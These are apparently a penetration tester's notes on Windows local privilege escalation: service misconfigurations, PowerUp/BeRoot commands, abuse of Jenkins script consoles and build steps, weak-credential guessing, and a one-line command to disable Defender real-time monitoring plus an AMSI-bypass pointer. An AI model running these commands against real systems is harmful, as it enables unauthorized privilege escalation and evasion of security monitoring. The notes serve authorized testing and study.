# Local Privilege Escalation / AV Bypass

## Ways for local privesc

* Missing patches
* Automated deployment (e.g. C:\Windows\panther\unattend.xml, C:\Windows\Panther, C:\Windows\Panther\UnattendGC, C:\Windows\System32\sysprep\Panther, s ) and AutoLogon passwords in clear text in Windowds Registry
* AlwaysInstallElevated (Any user can run MSI as SYSTEM)
* Misonfigured Services (e.g. Unquoted Service path, Permissions with Services/Directories
* DLL Hijacking                 &#x20;
* Tools: \
  PowerUp - . .\PowerUp.ps1 Invoke-AllCheck\
  BeRoot - .\beRoot.exe\
  Privesc - . .\PrivEsc.ps1 Invoke-PrivEsc\
  Seatbelt - .\seatbelt.exe all&#x20;

## Service Issues using PowerUp

**Do all checks**\
. .\PowerUp.ps1\
Invoke-AllChecks

The Parameter "StartName" is the privilege e.g. LocalSystem\
The Parameter "CanRestart" is useful so we can restart it on our own and dont have to restart machine/wait until the service is restarted

**Get services with unquoted paths an a space in their name**\
GetServiceUnquoted -Verbose\
Get-WmiObject -Class win32\_service | select pathname

**Get services where the current user can write to its binary path or change arguments to the binary**\
Get-ModifiableServiceFile -Verbose&#x20;

**Get the services whose configuration current user can modify (e.g ACLs of the Service, maybe point service to different executable**\
****Get-ModifiableService -Verbose&#x20;



## Abusing Enterprise Applications

* If Windows based, the often run as SYSTEM or Local Administrator
* Often overlooked by the Security team
* CI/CD Tools are interesting for abuse because they often need local high privilege - e.g Jenkins
* Jenkins
  * Anonymous read rights are/were default and you could see the build executor like Windows Server....
  * No Bruteforce Protection / No lockout / No PW policy for Jenkins local accounts (Check UserID)
  * When we have admin to Jenkins Server: http://url/script => Get you to the script console, Goovy scripts can be executed
    * That code will run on the build master (not the slaves)
    * ![](<.gitbook/assets/image (6).png>)
  * Try Username:Username, Usern:ReverseOfUsername etc.
  * Try to "Configure"a  Project and add build step "Execute Windows Batch Command and enter "powershell -c \<command>&#x20;
    * http://url/job/\[ProjectName]/configure => 200 Code if we have the permissions=> Check with Burp for all Projects
    * Check all Projects with all Users
    * Put your build step as the first one, so it wil get executed no matter the errors of other steps
    *   E.g

        <figure><img src=".gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>



## **Misc**

**AMSI Bypass**\
****amsi.fail

**Disable AV Protection/Monitoring**\
Set-MpPreference -DisableRealtimeMonitoring $true

**Check Powershell Language Mode**\
$ExecutionContext.SessionState.LanguageMode

**AppLocker Policy**\
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections



## PrivEsc Scripts

{% embed url="https://github.com/enjoiz/Privesc" %}

. .\privesc.ps1\
Invoke-PrivEsc

{% embed url="https://github.com/AlessandroZ/BeRoot./beRoot.exe" %}

./beroot.exe

{% embed url="https://github.com/HarmJ0y/PowerUp" %}

```
. ./powerup
Invoke-allchecks
Get-ServiceUnquoted -Verbose
Get-ModifiableServiceFile -Verbose
Invoke-ServiceAbuse
Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName '<domain>\<username>'
```

{% embed url="https://github.com/S1ckB0y1337/WinPwn" %}
